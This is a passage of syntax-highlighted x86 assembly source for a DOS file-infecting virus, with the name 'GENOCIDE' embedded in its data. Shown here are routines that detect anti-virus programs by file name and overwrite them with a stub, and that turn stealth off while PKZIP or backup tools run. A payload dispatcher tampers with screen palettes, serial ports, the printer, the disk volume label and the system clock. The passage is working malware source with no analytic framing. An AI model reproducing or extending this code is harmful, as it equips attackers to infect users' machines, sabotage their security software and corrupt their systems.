                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; to ivt zone</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04</span><span class="sc0">               </span><span class="sc1">; to int24h table</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; restore int24h handler</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">hnd_24h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">check_fname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; DI on SFT</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; offset of filename in SFT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_strings</span><span class="sc0">    </span><span class="sc1">; to strings with av and such</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get lenght of this string</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; compare substring</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_string</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; on next string</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; get system date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; dl &lt;- month in bcd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; dh &lt;- year in bcd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9606h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">exit_loops</span><span class="sc0">              </span><span class="sc1">; jump if &lt; june 1996</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">loop_strings</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; next string lenght</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">founded_l_0</span><span class="sc0">             </span><span class="sc1">; all the AV strings done</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; compare substrings</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_string</span><span class="sc0">            </span><span class="sc1">; if equal then exit and notice</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_strings</span><span class="sc0">      </span><span class="sc1">; loop through all substrings</span><span class="sc0">
</span><span class="sc5">founded_l_0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">payload_byte</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_loops</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; continue to DOO, WOLF, QUA</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loop_strings</span><span class="sc0">            </span><span class="sc1">; too or check if real end</span><span class="sc0">
</span><span class="sc5">exit_loops</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">found_string</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">20cdh</span><span class="sc0">     </span><span class="sc1">; int20h opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write to file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; write two bytes</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_wtime</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rest_attrib</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">func_21h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">4bh</span><span class="sc0">  </span><span class="sc1">; exec</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_execfnc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">4bffh</span><span class="sc0">      </span><span class="sc1">; if exec function then</span><span class="sc0">
                                                        </span><span class="sc1">; change AL to ffh</span><span class="sc0">
</span><span class="sc5">not_execfnc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">back_inf_w24</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">check_nostealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this checks if PKZIP or a backup tool (*BA*) are running. if so it will</span><span class="sc0">
</span><span class="sc1">; set carry and the virus will disable its stealth routines.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                  </span><span class="sc1">; get psp</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; ds = mcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                  </span><span class="sc1">; program name + 02h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'IZ'</span><span class="sc0">      </span><span class="sc1">; pkZIp running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">disable_it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'AB'</span><span class="sc0">      </span><span class="sc1">; msBAckup or such running?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">disable_it</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">disable_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc5">check_payload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">payload_byte</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; check payload byte</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; if 0 then no activation</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dododo</span><span class="sc0">                  </span><span class="sc1">; else can be from 1 to 8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; just go back</span><span class="sc0">
</span><span class="sc5">dododo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">al_bigger_1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                  </span><span class="sc1">; open file function</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">payload_al_1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                  </span><span class="sc1">; delete file function</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">payload_al_1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; else don't activate</span><span class="sc0">
</span><span class="sc5">payload_al_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1010h</span><span class="sc0">                </span><span class="sc1">; set bx register to colors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; in dh,ch,cl</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; set bx register to colors</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                     </span><span class="sc1">; in dh,ch,cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fast_retu</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">al_bigger_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">al_bigger_2</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                  </span><span class="sc1">; select default drive function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; else don't activate</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">101bh</span><span class="sc0">                </span><span class="sc1">; sum cx color values to gray</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fast_retu</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">al_bigger_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">al_bigger_3</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc0">                  </span><span class="sc1">; remove directory function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; else don't activate</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; set single palette register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                  </span><span class="sc1">; overscan color register</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fast_retu</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">al_bigger_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">al_bigger_4</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write to file function</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; else don't activate</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2f8h</span><span class="sc0">                 </span><span class="sc1">; com2 adress</span><span class="sc0">
</span><span class="sc5">port_out_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; send this data byte on</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; the first loop to com2</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">                      </span><span class="sc1">; and on the second to com1</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">port_out_loop</span><span class="sc0">

</span><span class="sc5">al_bigger_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">al_bigger_5</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc0">                  </span><span class="sc1">; create temporary file</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">               </span><span class="sc1">; else don't activate</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; virus name lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_name</span><span class="sc0">    </span><span class="sc1">; point at it</span><span class="sc0">
</span><span class="sc5">print_vname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; write char to printer</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; char to print</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">                     </span><span class="sc1">; print that</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">print_vname</span><span class="sc0">

</span><span class="sc5">al_bigger_5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">al_bigger_6</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">440dh</span><span class="sc0">                </span><span class="sc1">; ioctl request</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">846h</span><span class="sc0">                 </span><span class="sc1">; set volume and SN on hd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vol_ser</span><span class="sc0">       </span><span class="sc1">; DS:DX DPB to virus new data</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">

</span><span class="sc5">al_bigger_6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fast_retu</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; get system clock</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">; increment minutes by one</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1ah</span><span class="sc0">                     </span><span class="sc1">; set system clock</span><span class="sc0">
</span><span class="sc5">fast_retu</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; return from payload routines</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vol_ser</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GENOCIDEYouthEnergy'</span><span class="sc0">

</span><span class="sc1">; table for extra track formattation</span><span class="sc0">
</span><span class="sc5">format_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
